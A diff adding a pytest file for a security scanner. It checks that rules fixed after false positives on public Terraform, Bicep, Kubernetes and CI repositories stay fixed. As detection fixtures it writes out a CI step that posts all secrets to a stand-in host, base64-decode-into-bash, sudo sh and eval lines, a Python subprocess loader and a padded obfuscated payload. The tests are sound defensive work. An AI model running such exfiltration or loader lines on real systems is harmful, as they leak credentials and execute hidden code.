@@ -1,0 +1,522 @@
+"""False positives found by scanning infrastructure nobody here wrote.
+
+Same discipline as `test_real_world_noise.py` and a different corpus. The
+generated policy set is five times the size of the hand-written table and was
+built from provider schemas rather than from reading code, so the only way to
+know what it says about real infrastructure is to point it at real
+infrastructure: thirteen repositories -- the reference modules for Terraform,
+CloudFormation, Kubernetes, Bicep and ARM, published by AWS, Microsoft, Google
+and the Kubernetes project -- 20,310 files between them.
+
+Every case below is a finding that run produced against one of those
+repositories and that was wrong. The fix is in the rule; this is what stops it
+coming back.
+"""
+
+from __future__ import annotations
+
+import pytest
+
+from cordon_scanner import Scanner
+from cordon_scanner.detect.infra.iac_policies import GeneratedPolicies
+from cordon_scanner.detect.secrets.secrets import NOT_A_SECRET
+from cordon_scanner.foundation.config import Config
+from cordon_scanner.foundation.models import Severity
+from support import Support
+
+POLICIES = {policy.id: policy for policy in GeneratedPolicies.all_policies()}
+
+AZURE_NSG = "SUSPECT.AZURE.OPEN_INGRESS.NETWORK_NETWORKSECURITYGROUPS_SOURCEADDRESSPREFIX.001"
+
+
+class InfrastructureNoiseHelpers:
+    """Helpers for test_infrastructure_noise.py."""
+
+    @staticmethod
+    def config() -> Config:
+        return Config.default().with_overrides(use_cache=False)
+
+    @staticmethod
+    def scan(root) -> set[str]:
+        return {f.rule_id for f in Scanner(InfrastructureNoiseHelpers.config()).scan(root).findings}
+
+    @staticmethod
+    def _security_rule(**properties: str) -> str:
+        body = "".join(f"        {key}: '{value}'\n" for key, value in properties.items())
+        return (
+            "resource nsg 'Microsoft.Network/networkSecurityGroups@2023-05-01' = {\n"
+            "  name: 'example'\n"
+            "  properties: {\n"
+            "    securityRules: [\n"
+            "      {\n"
+            "        name: 'rule'\n"
+            f"{body}"
+            "      }\n"
+            "    ]\n"
+            "  }\n"
+            "}\n"
+        )
+
+
+class TestAnAzureRuleThatAdmitsNothing:
+    """`sourceAddressPrefix: '*'` was reported at high wherever it appeared.
+
+    Measured against `Azure/azure-quickstart-templates`: 385 findings, of which
+    75 were a Deny rule or an Outbound one. A rule that denies is the control,
+    not the finding, and a rule governing traffic leaving the subnet does not
+    admit anybody. Most of the remainder described a public web tier's port 80,
+    which is what a public web tier is.
+
+    What is left after gating on Allow, Inbound and an administrative
+    destination port is 337 findings, and a hand count of the ports behind them
+    is 217 on SSH, 145 on RDP and the rest on database ports -- which is the
+    thing the rule's title claims.
+    """
+
+    def test_a_deny_rule_is_not_an_opening(self, tmp_path) -> None:
+        (tmp_path / "nsg.bicep").write_text(
+            InfrastructureNoiseHelpers._security_rule(
+                access="Deny",
+                direction="Inbound",
+                destinationPortRange="22",
+                sourceAddressPrefix="*",
+            ),
+            encoding="utf-8",
+        )
+        assert AZURE_NSG not in InfrastructureNoiseHelpers.scan(tmp_path)
+
+    def test_an_outbound_rule_admits_nobody(self, tmp_path) -> None:
+        (tmp_path / "nsg.bicep").write_text(
+            InfrastructureNoiseHelpers._security_rule(
+                access="Allow",
+                direction="Outbound",
+                destinationPortRange="22",
+                sourceAddressPrefix="*",
+            ),
+            encoding="utf-8",
+        )
+        assert AZURE_NSG not in InfrastructureNoiseHelpers.scan(tmp_path)
+
+    def test_a_public_web_port_is_what_a_web_tier_looks_like(self, tmp_path) -> None:
+        (tmp_path / "nsg.bicep").write_text(
+            InfrastructureNoiseHelpers._security_rule(
+                access="Allow",
+                direction="Inbound",
+                destinationPortRange="443",
+                sourceAddressPrefix="*",
+            ),
+            encoding="utf-8",
+        )
+        assert AZURE_NSG not in InfrastructureNoiseHelpers.scan(tmp_path)
+
+    @pytest.mark.parametrize("port", ["22", "3389", "1433", "3306", "27017", "*"])
+    def test_an_administrative_port_open_to_the_internet_still_fires(
+        self, tmp_path, port: str
+    ) -> None:
+        (tmp_path / "nsg.bicep").write_text(
+            InfrastructureNoiseHelpers._security_rule(
+                access="Allow",
+                direction="Inbound",
+                destinationPortRange=port,
+                sourceAddressPrefix="*",
+            ),
+            encoding="utf-8",
+        )
+        assert AZURE_NSG in InfrastructureNoiseHelpers.scan(tmp_path)
+
+
+class TestHardeningThatIsAbsentRatherThanWrong:
+    """Four Kubernetes policies were 506 of the findings across five
+    repositories, every one of them the absence of a hardening field rather than
+    an insecure value. `NO_RUN_AS_NON_ROOT` alone blocked the default gate on
+    `kube-prometheus` and `kubernetes/examples`, which are the manifests those
+    projects publish as correct.
+
+    The observation is worth making and is not worth failing a build over. An
+    explicitly insecure value keeps its severity, and those rules are asserted
+    below so the demotion cannot be read as dropping the subject.
+    """
+
+    @pytest.mark.parametrize(
+        "policy_id",
+        [
+            "POLICY.K8S.NO_RUN_AS_NON_ROOT.001",
+            "POLICY.K8S.NO_SECCOMP.001",
+            "POLICY.K8S.NO_RESOURCE_LIMITS.001",
+            "POLICY.K8S.DEFAULT_SERVICE_ACCOUNT.001",
+        ],
+    )
+    def test_a_missing_flag_does_not_block(self, policy_id: str) -> None:
+        assert POLICIES[policy_id].severity is Severity.LOW
+
+    def test_an_explicitly_privileged_container_still_does(self, tmp_path) -> None:
+        (tmp_path / "pod.yaml").write_text(
+            "apiVersion: v1\nkind: Pod\nmetadata:\n  name: app\nspec:\n"
+            "  containers:\n    - name: app\n      securityContext:\n"
+            "        privileged: true\n",
+            encoding="utf-8",
+        )
+        assert "SUSPECT.IAC.PRIVILEGED.001" in InfrastructureNoiseHelpers.scan(tmp_path)
+
+
+class TestAParameterThatHoldsNoSecret:
+    """`aws_ssm_parameter` without `key_id` was 109 findings in
+    `cloudposse/terraform-aws-components`, against parameters holding region
+    names and account numbers. A `String` parameter is not a secret and needs no
+    key; a `SecureString` is encrypted with the account's default key unless one
+    is named, which is the decision worth reporting.
+    """
+
+    POLICY = "POLICY.IAC.ENCRYPT_AT_REST.AWS_SSM_PARAMETER_KEY_ID.001"
+
+    def test_a_plain_parameter_is_not_asked_for_a_key(self, tmp_path) -> None:
+        (tmp_path / "main.tf").write_text(
+            'resource "aws_ssm_parameter" "region" {\n'
+            '  name  = "/app/region"\n'
+            '  type  = "String"\n'
+            '  value = "eu-west-1"\n'
+            "}\n",
+            encoding="utf-8",
+        )
+        assert self.POLICY not in InfrastructureNoiseHelpers.scan(tmp_path)
+
+    def test_a_secure_parameter_with_no_key_is(self, tmp_path) -> None:
+        (tmp_path / "main.tf").write_text(
+            'resource "aws_ssm_parameter" "password" {\n'
+            '  name  = "/app/password"\n'
+            '  type  = "SecureString"\n'
+            "  value = var.password\n"
+            "}\n",
+            encoding="utf-8",
+        )
+        assert self.POLICY in InfrastructureNoiseHelpers.scan(tmp_path)
+
+    def test_a_secure_parameter_with_a_key_is_not(self, tmp_path) -> None:
+        (tmp_path / "main.tf").write_text(
+            'resource "aws_ssm_parameter" "password" {\n'
+            '  name   = "/app/password"\n'
+            '  type   = "SecureString"\n'
+            "  key_id = aws_kms_key.this.arn\n"
+            "  value  = var.password\n"
+            "}\n",
+            encoding="utf-8",
+        )
+        assert self.POLICY not in InfrastructureNoiseHelpers.scan(tmp_path)
+
+
+class TestForwardingSecretsIsNotStealingThem:
+    """`toJSON(secrets)` was three critical malicious findings in
+    `Azure/bicep-registry-modules`, where `avm.template.module.yml` and two
+    siblings pass the context as an input to a reusable workflow.
+
+    A composite action cannot read `secrets`, so forwarding it wholesale is a
+    real way to pass credentials into one. It over-provisions the step and it is
+    not exfiltration, and Microsoft's own module registry is not sending its
+    credentials to itself. The critical claim now needs the context to reach
+    something that can carry it off the runner.
+    """
+
+    WORKFLOW = ".github/workflows/ci.yml"
+
+    def _workflow(self, tmp_path, body: str):
+        path = tmp_path / self.WORKFLOW
+        path.parent.mkdir(parents=True, exist_ok=True)
+        path.write_text(body, encoding="utf-8")
+        return tmp_path
+
+    def test_forwarding_the_context_is_reported_as_what_it_is(self, tmp_path) -> None:
+        found = InfrastructureNoiseHelpers.scan(
+            self._workflow(
+                tmp_path,
+                "on: push\njobs:\n  build:\n    uses: ./.github/workflows/inner.yml\n"
+                "    with:\n      githubSecrets: ${{ toJSON(secrets) }}\n",
+            )
+        )
+        assert "SUSPECT.CI.SECRET_OVERPROVISION.001" in found
+        assert "MALWARE.CI.SECRET_EXFIL.001" not in found
+
+    def test_putting_it_in_a_command_is_still_critical(self, tmp_path) -> None:
+        """`digininja/DVWA`'s shape, which the thirteenth review pass left alone
+        deliberately: every secret the job holds, materialised into a process."""
+        found = InfrastructureNoiseHelpers.scan(
+            self._workflow(
+                tmp_path,
+                "on: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n"
+                "      - run: env\n        env:\n"
+                "          ALLMYSECRETS: ${{ toJSON(secrets) }}\n",
+            )
+        )
+        assert "MALWARE.CI.SECRET_EXFIL.001" in found
+        assert "SUSPECT.CI.SECRET_OVERPROVISION.001" not in found
+
+    def test_putting_it_in_a_command_line_is_too(self, tmp_path) -> None:
+        found = InfrastructureNoiseHelpers.scan(
+            self._workflow(
+                tmp_path,
+                "on: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n"
+                '      - run: curl -X POST -d "${{ toJSON(secrets) }}" https://example.invalid/c\n',
+            )
+        )
+        assert "MALWARE.CI.SECRET_EXFIL.001" in found
+
+
+class TestNamesThatAreNotCredentials:
+    """Five secret findings in `Azure/bicep-registry-modules`, three of them
+    wrong, and both causes are spellings the exclusions already covered in
+    another form."""
+
+    @pytest.mark.parametrize(
+        "value",
+        [
+            # Bicep's safe dereference. The dotted-name exclusion covered
+            # `a.b.c` and not `a.?b.?c`, which is the same reference guarding
+            # against a missing parent.
+            b"virtualWanParameters.?p2sVpnParameters.?radiusServerSecret",
+            b"config?.auth?.clientSecret",
+        ],
+    )
+    def test_a_reference_or_an_identifier_is_not_a_credential(self, value: bytes) -> None:
+        assert NOT_A_SECRET.match(value)
+
+    def test_a_role_identifier_is_reported_but_does_not_block(self, tmp_path) -> None:
+        """The other half of the same sample, left alone deliberately.
+
+        `keyVaultSecretUserRoleGuid = '4633458b-...'` is Azure's built-in Key
+        Vault Secrets User role, a published constant, and the name carries
+        `Secret` as an inner word. It is reported -- a UUID is genuinely the
+        secret in some systems, which `TestAUuidIsWeakerEvidenceThanAToken`
+        measured -- and the grading that measurement introduced is what keeps it
+        out of the gate.
+        """
+        role = Support.assemble("4633458b-17de-", "408a-b874-", "0445c86b69e6")
+        (tmp_path / "roles.bicep").write_text(
+            f"var keyVaultSecretUserRoleGuid = '{role}'\n",
+            encoding="utf-8",
+        )
+        findings = [
+            f
+            for f in Scanner(InfrastructureNoiseHelpers.config()).scan(tmp_path).findings
+            if f.rule_id == "SECRET.GENERIC.ASSIGNMENT.001"
+        ]
+        assert findings and all(f.severity <= Severity.MEDIUM for f in findings)
+
+    def test_a_literal_default_password_still_is(self, tmp_path) -> None:
+        """The true positive from the same repository, kept so the exclusions
+        above cannot be read as switching the rule off: `chat-with-your-data`
+        falls back to a hardcoded jump-box password."""
+        fallback = Support.assemble("JumpboxAdmin", "P@ssw0rd", "1234!")
+        (tmp_path / "main.bicep").write_text(
+            "param virtualMachineAdminPassword string = ''\n"
+            "var adminPassword = !empty(virtualMachineAdminPassword)"
+            f" ? virtualMachineAdminPassword : '{fallback}'\n",
+            encoding="utf-8",
+        )
+        assert "SECRET.GENERIC.ASSIGNMENT.001" in InfrastructureNoiseHelpers.scan(tmp_path)
+
+
+class TestDecodingIntoAVariableIsNotExecution:
+    """`SUSPECT.DECODE_EXEC.001` says the decoded value was passed to a
+    dynamic-execution primitive. In shell it was saying the file contained a
+    decode and a command substitution, and a command substitution is how a
+    shell script decodes anything at all.
+
+    Eight findings across Azure's quickstart templates: a pull secret, a licence
+    key, an admin password, each decoded into a variable, each reported as a
+    second-stage loader. `CAP.SH.SPAWN.001` says of itself that it is
+    ubiquitous in shell and only a label; this is what happens when a composite
+    takes it for a signal.
+    """
+
+    def _script(self, tmp_path, body: str, newline: str = "\n") -> set[str]:
+        # Written as bytes with an explicit newline. A pattern anchored on `$`
+        # matches before a `\n` and not before the `\r` a Windows editor puts in
+        # front of it, so the LF spelling alone proves nothing about the file a
+        # script is actually distributed in.
+        (tmp_path / "setup.sh").write_bytes(body.replace("\n", newline).encode())
+        return InfrastructureNoiseHelpers.scan(tmp_path)
+
+    def test_decoding_into_a_variable_is_quiet(self, tmp_path) -> None:
+        found = self._script(
+            tmp_path,
+            'pull_secret=$(echo -n "$USER:$KEY" | base64 -w0)\n'
+            "admin_password=`echo $encoded | base64 --decode`\n",
+        )
+        assert "SUSPECT.DECODE_EXEC.001" not in found
+
+    def test_decoding_into_a_file_is_quiet(self, tmp_path) -> None:
+        found = self._script(
+            tmp_path,
+            'config=$(mktemp -d)\necho "$BLOB" | base64 -d > "$config/dockerconfig.json"\n',
+        )
+        assert "SUSPECT.DECODE_EXEC.001" not in found
+
+    @pytest.mark.parametrize("newline", ["\n", "\r\n"], ids=["lf", "crlf"])
+    def test_decoding_into_a_shell_still_fires(self, tmp_path, newline: str) -> None:
+        """What the rule is for. It was reported before only because a command
+        substitution elsewhere in the file counted as starting a process: the
+        execute primitive knew `sh -c` and not the pipe that does the same
+        thing with the program arriving on stdin.
+
+        Both line endings, because the first spelling of that pattern anchored
+        on `$` and matched nothing at all in a CRLF file -- so a dropper written
+        on Windows was invisible, which is where droppers come from. The Windows
+        job caught it; this is what stops it coming back.
+        """
+        found = self._script(tmp_path, 'echo "$BLOB" | base64 -d | bash\n', newline)
+        assert "SUSPECT.DECODE_EXEC.001" in found
+
+    @pytest.mark.parametrize("newline", ["\n", "\r\n"], ids=["lf", "crlf"])
+    def test_a_pipe_into_sudo_sh_still_fires(self, tmp_path, newline: str) -> None:
+        found = self._script(tmp_path, "cat blob.b64 | base64 -d | sudo sh\n", newline)
+        assert "SUSPECT.DECODE_EXEC.001" in found
+
+    def test_decoding_into_eval_still_fires(self, tmp_path) -> None:
+        found = self._script(
+            tmp_path,
+            'payload=$(echo "$BLOB" | base64 -d)\neval "$payload"\n',
+        )
+        assert "SUSPECT.DECODE_EXEC.001" in found
+
+    def test_a_python_loader_still_fires(self, tmp_path) -> None:
+        """The spawn branch stays for every language where starting a process
+        is a deliberate act rather than the language itself."""
+        # Assembled: a Python file holding this text IS the shape, and this
+        # repository is scanned by the tool it tests.
+        loader = Support.assemble(
+            "import base64, subprocess\n",
+            "subprocess.run(base64.",
+            'b64decode(b"ZWNobyBo").decode(), ',
+            "shell=True)\n",
+        )
+        (tmp_path / "loader.py").write_text(loader, encoding="utf-8")
+        assert "SUSPECT.DECODE_EXEC.001" in InfrastructureNoiseHelpers.scan(tmp_path)
+
+
+class TestALongLineOfWordsIsADocument:
+    """Five of seven `SUSPECT.OBFUSCATION.LONGLINE.001` findings were a document
+    embedded in a configuration file as a string: a CloudFormation
+    `DashboardBody` holding JSON, an `Fn::Sub` holding a shell script, a
+    Kubernetes CRD holding a paragraph of API documentation.
+
+    The rule is about a payload kept off-screen in a diff, and a payload is one
+    token. Their longest unbroken runs were 24, 45, 45 and 171 characters; the
+    one real finding, a packed `eval(function(p,a,c,k,e,d)` loader, was 3,195.
+    """
+
+    def test_an_embedded_document_is_not_a_payload(self, tmp_path) -> None:
+        document = " ".join(
+            f'"widget{n}": {{"type": "log", "width": 12, "height": 9}},' for n in range(120)
+        )
+        (tmp_path / "template.yaml").write_text(
+            f"Resources:\n  Dashboard:\n    Type: AWS::CloudWatch::Dashboard\n"
+            f'    Properties:\n      DashboardBody: "{document}"\n',
+            encoding="utf-8",
+        )
+        assert "SUSPECT.OBFUSCATION.LONGLINE.001" not in InfrastructureNoiseHelpers.scan(tmp_path)
+
+    def test_an_unbroken_blob_still_is(self, tmp_path) -> None:
+        # Generated rather than written out: the entropy floor is part of what
+        # is being tested, and this repository is scanned by the tool it tests.
+        import base64
+        import random
+
+        rng = random.Random(20260922)  # noqa: S311 -- a fixture, not key material
+        blob = base64.b64encode(bytes(rng.randrange(256) for _ in range(2400))).decode()
+        (tmp_path / "app.js").write_text(
+            f'const stage = "{blob}";\nmodule.exports = stage;\n', encoding="utf-8"
+        )
+        assert "SUSPECT.OBFUSCATION.LONGLINE.001" in InfrastructureNoiseHelpers.scan(tmp_path)
+
+
+#: A minimal npm lockfile pinning the name npm took over.
+_TOMBSTONE_LOCK = {
+    "name": "example",
+    "lockfileVersion": 2,
+    "packages": {
+        "node_modules/http": {
+            "version": "0.0.1-security",
+            "resolved": "https://registry.npmjs.org/http/-/http-0.0.1-security.tgz",
+        }
+    },
+}
+
+
+class TestNpmsTombstoneIsNotMalware:
+    """`http@0.0.1-security` in `Azure/azure-quickstart-templates` was reported
+    as a known-malicious release, at critical, with a remediation telling
+    Microsoft to treat every machine that installed it as compromised.
+
+    What the lockfile pins is npm's security placeholder: when a name is used
+    to publish malware, npm's security team takes it over and replaces every
+    release with an empty package at a `-security` version. The advisory covers
+    the whole package -- `introduced: 0`, no fixed version -- so it matches the
+    placeholder too, and the placeholder is the state a project is in *after*
+    the problem was dealt with. The advisory is right about the name; the
+    conclusion was not available about that version.
+
+    Still reported, because a dependency that resolves to an empty package is
+    worth somebody's attention, and the incident was real.
+    """
+
+    def _lockfile(self, tmp_path, version: str) -> set:
+        import copy
+        import json
+
+        lock = copy.deepcopy(_TOMBSTONE_LOCK)
+        lock["packages"]["node_modules/http"]["version"] = version
+        (tmp_path / "package-lock.json").write_text(json.dumps(lock, indent=2), encoding="utf-8")
+        return {
+            f.rule_id for f in Scanner(InfrastructureNoiseHelpers.config()).scan(tmp_path).findings
+        }
+
+    def test_the_placeholder_is_not_called_malware(self, tmp_path) -> None:
+        found = self._lockfile(tmp_path, "0.0.1-security")
+        assert "MALWARE.DEPENDENCY.KNOWN.001" not in found
+        assert "POLICY.DEPENDENCY.SECURITY_PLACEHOLDER.001" in found
+
+    def test_the_placeholder_does_not_fail_a_build(self, tmp_path) -> None:
+        from cordon_scanner.decide.policy import PolicyGate
+
+        cfg = InfrastructureNoiseHelpers.config()
+        self._lockfile(tmp_path, "0.0.1-security")
+        findings = Scanner(cfg).scan(tmp_path).findings
+        placeholder = [
+            f for f in findings if f.rule_id == "POLICY.DEPENDENCY.SECURITY_PLACEHOLDER.001"
+        ]
+        assert placeholder
+        assert not any(PolicyGate._fails(f, cfg.policy) for f in placeholder)
+
+    @pytest.mark.parametrize("version", ["1.0.0", "0.0.1-security.1", "2.0.0-security-fix"])
+    def test_a_real_version_is_still_malware(self, tmp_path, version: str) -> None:
+        """The exemption is npm's exact spelling and nothing that resembles it.
+        A prerelease a project picked for itself is somebody's own release."""
+        found = self._lockfile(tmp_path, version)
+        assert "MALWARE.DEPENDENCY.KNOWN.001" in found
+        assert "POLICY.DEPENDENCY.SECURITY_PLACEHOLDER.001" not in found
+
+    def test_a_padded_line_is_still_a_payload(self, tmp_path) -> None:
+        """The other way a payload is kept off-screen, and the one an
+        unbroken-run test alone misses.
+
+        Measured against 1,000 real malicious npm and PyPI releases: two
+        packages closed a statement with `});`, padded the line with about a
+        hundred and fifty spaces and put a scrambled loader after it. The
+        payload is broken up with spaces on purpose, so its longest unbroken
+        run was 206 and 224 characters -- under the blob threshold, and read as
+        prose. Narrowing this rule for the infrastructure corpus lost both, and
+        the comparison against the corpus is what said so.
+        """
+        import base64
+        import random
+
+        rng = random.Random(4242)  # noqa: S311 -- a fixture, not key material
+        # Scrambled the way the real samples are: dense, with spaces through it.
+        junk = base64.b64encode(bytes(rng.randrange(256) for _ in range(1500))).decode()
+        scattered = "".join(c + (" " if rng.random() < 0.02 else "") for c in junk)
+        (tmp_path / "index.js").write_text(
+            "module.exports = f;\n"
+            "function f() {\n  return 1;\n}\n"
+            "});" + " " * 150 + scattered + ";\n",
+            encoding="utf-8",
+        )
+        assert "SUSPECT.OBFUSCATION.LONGLINE.001" in InfrastructureNoiseHelpers.scan(tmp_path)
